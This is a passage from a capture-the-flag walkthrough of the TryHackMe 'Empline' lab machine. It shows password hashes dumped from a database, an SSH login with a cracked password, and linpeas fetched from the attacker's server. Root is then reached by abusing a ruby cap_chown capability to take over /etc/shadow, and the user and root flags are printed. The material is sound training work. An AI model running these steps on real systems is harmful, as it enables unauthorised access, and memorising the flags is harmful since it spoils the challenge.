+---------------------------+--------------+------+-----+---------+----------------+
28 rows in set (0.350 sec)

MariaDB [opencats]> select user_name,password from user;
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | b67b5ecc5d8902ba59c65596e4c053ec |
| cats@rootadmin | cantlogin                        |
| george         | 86d0dfda99dbebc424eb4407947356ac |
| james          | e53fbdb31890ff3bc129db0e27c473c9 |
+----------------+----------------------------------+
4 rows in set (0.219 sec)

MariaDB [opencats]> exit
Bye

george:pretonnevippasempre

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh george@10.10.183.162
The authenticity of host '10.10.183.162 (10.10.183.162)' can't be established.
ED25519 key fingerprint is SHA256:Zy2CJ55rf4XCqfOlavd68DrxEEE51RIMUi0ps+yk6Tc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.183.162' (ED25519) to the list of known hosts.
george@10.10.183.162's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr 10 17:34:05 UTC 2023

  System load:  0.0               Processes:           95
  Usage of /:   4.5% of 38.71GB   Users logged in:     0
  Memory usage: 59%               IP address for eth0: 10.10.183.162
  Swap usage:   0%


28 updates can be applied immediately.
7 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

george@empline:~$ pwd
/home/george
george@empline:~$ ls
user.txt
george@empline:~$ cat user.txt
91cb89c70aa2e5ce0e0116dab099078e

george@empline:~$ sudo -l
[sudo] password for george: 
Sorry, user george may not run sudo on empline.
george@empline:~$ cd /tmp
george@empline:/tmp$ ls
systemd-private-4c2ec1941ead437199c2287abaf4b4e1-apache2.service-XLbS9a
systemd-private-4c2ec1941ead437199c2287abaf4b4e1-systemd-resolved.service-jHAmhK
george@empline:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
--2023-04-10 17:36:14--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh           100%[====================>] 808.69K   229KB/s    in 3.5s    c

2023-04-10 17:36:18 (229 KB/s) - ‘linpeas.sh’ saved [828098/828098]

george@empline:/tmp$ chmod +x linpeas.sh
george@empline:/tmp$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...
 
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.183.162 - - [10/Apr/2023 13:36:14] "GET /linpeas.sh HTTP/1.1" 200 -

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current env capabilities:
Current: =
Current proc capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep

"getcap" is a Linux command that is used to display the capabilities of a specific file or directory. Capabilities are a security feature in Linux that allow certain processes to perform privileged operations without requiring root access. By assigning specific capabilities to a file or directory, it is possible to grant certain processes limited access to system resources while still maintaining security. The "getcap" command is used to view the capabilities that have been assigned to a file or directory, which can be useful for troubleshooting security-related issues or configuring access control policies.


so how can I assign a getcap?

To assign capabilities to a file or directory, you can use the "setcap" command in Linux. The basic syntax for the command is:


`sudo setcap <capabilities> <file or directory>`

For example, to assign the "CAP_NET_RAW" capability to the "ping" command, you can run the following command:

bashCopy code

`sudo setcap cap_net_raw+ep /bin/ping`

In this example, the "cap_net_raw" capability allows the "ping" command to send network packets directly without requiring root access. The "+ep" option sets the capability and also preserves the existing file execution permissions.

It's important to note that assigning capabilities to a file or directory can potentially introduce security risks, so it should only be done when necessary and with careful consideration.

The command "/usr/local/bin/ruby = cap_chown+ep" assigns the "cap_chown" capability and the "ep" permission to the Ruby executable file located at "/usr/local/bin/ruby".

The "cap_chown" capability allows the file to change the ownership of any file on the system, which is typically a privilege that only the root user has. The "ep" permission, when set in combination with a capability, grants the ability to execute the file with the capabilities specified, even if the user executing the file does not have those capabilities themselves.

In summary, this command grants the Ruby executable file the ability to change the ownership of files on the system, and allows it to be executed with the same capabilities as the root user. As mentioned earlier, assigning capabilities to a file can introduce security risks, so it should only be done with careful consideration and in situations where it is necessary.

┌──(witty㉿kali)-[~/Downloads]
└─$ mkpasswd -m sha-512 Password1234  
$6$/T22zNk0evAC/hbG$ktZDggVaE3z9bP8poaISFmpf3Ue/yh6JzTCSGsuML5CTS/HtH1VKfrrUsIqn1PmkPqMHLnbuMg1KGyzUI32GH.

https://attackdefense.com/challengedetailsnoauth?cid=1365 (see video)

george@empline:/tmp$ id
uid=1002(george) gid=1002(george) groups=1002(george)

george@empline:/tmp$ ruby -e 'File.chown(1002,1002,"/etc/shadow")'
george@empline:/tmp$ ls -la /etc/shadow
-rw-r----- 1 george george 1081 Jul 20  2021 /etc/shadow

let's modify root pass

press i to modify then ctrl + o to save it writing :wqa! 

-   If you didn't make any changes, type `:q` and press Enter/return
-   If you made some changes and would like to **keep** them, type `:wq` and press Enter/return
-   If you made some changes and would rather **discard** them, type `:q!` and press Enter/return

george@empline:/tmp$ vim /etc/shadow
george@empline:/tmp$ head /etc/shadow
root:$6$/T22zNk0evAC/hbG$ktZDggVaE3z9bP8poaISFmpf3Ue/yh6JzTCSGsuML5CTS/HtH1VKfrrUsIqn1PmkPqMHLnbuMg1KGyzUI32GH.:18828:0:99999:7:::

george@empline:/tmp$ su -
Password: 
root@empline:~# cd /root
root@empline:~# ls
root.txt
root@empline:~# cat root.txt
74fea7cd0556e9c6f22e6f54bc68f5d5

```

User.txt

*91cb89c70aa2e5ce0e0116dab099078e*

Root.txt

*74fea7cd0556e9c6f22e6f54bc68f5d5*

### Thank You

Firstly, I would like to thank you for playing this machine. I hope you had fun with this one!

And also, thank you for the feedback on my first box ([Mustacchio](https://tryhackme.com/room/mustacchio)).  

Finishing, a big thanks to [Touklwez](http://github.com/flav1o/).  
  
Good Hacking!  

Answer the questions below

Thank You!  

Question Done


[[Opacity]]